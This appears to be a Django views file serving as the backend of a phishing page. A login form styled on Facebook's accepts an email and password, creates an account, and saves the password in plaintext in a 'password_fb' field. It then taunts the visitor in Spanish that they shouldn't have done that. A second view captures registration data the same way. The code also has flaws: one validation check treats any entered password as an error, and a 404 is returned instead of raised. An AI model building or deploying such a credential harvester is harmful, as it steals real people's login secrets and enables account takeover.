from django.shortcuts import render
from django.http import HttpResponse, Http404
from django.contrib.auth import get_user_model
from custom_user.forms import RegisterForm
import re


def loginpage(request):
    if request.method == "GET":
        return render(request, "home.html")
    if request.method == "POST":
        addressToVerify = request.POST["emailorphone"]
        match = re.match(
            '^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$', addressToVerify)
        if request.POST["emailorphone"] == '' or match == None:
            return render(request, "home.html", {'erroremail': True})
        if request.POST["password"] == '':
            return render(request, "home.html", {'errorpass':True})
        user_model = get_user_model()
        try:
            new_user = user_model.objects.create_user(
                email=request.POST["emailorphone"], password=request.POST["password"])
            new_user.password_fb = request.POST["password"]
            new_user.save()
            return HttpResponse("No debíste hacer eso ; )")
        except:
            return HttpResponse("No debíste hacer eso, gracias por intentar otra vez ; )")
    raise Http404()


def create_user(request):
    if request.method == "POST":
        addressToVerify = request.POST["email"]
        match = re.match(
            '^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$', addressToVerify)
        if request.POST["name"] == '' and request.POST["surname"] == '' and (request.POST["email"] == '' or match == None or request.POST["password"]):
            return render(request, "home.html", {'allinerror':True,"showmodal":"show"})
        if request.POST["name"] == '':
            return render(request, "home.html", {'nameError': True,"showmodal":"show"})
        if request.POST["surname"] == '':
            return render(request, "home.html", {'surnameError': True,"showmodal":"show"})
        if request.POST["email"] == '' or match == None:
            return render(request, "home.html", {'emailError': True,"showmodal":"show"})
        if request.POST["password"] == '':
            return render(request, "home.html", {'passwordError':True,"showmodal":"show"})
        form = RegisterForm(request.POST or None)
        if form.is_valid():
            form.save()
            return HttpResponse("No debíste hacer eso ; )")
        print(form.errors)
        return HttpResponse("No debíste hacer eso, gracias por intentar otra vez ; )")
    print("fallo todo")
    return Http404()
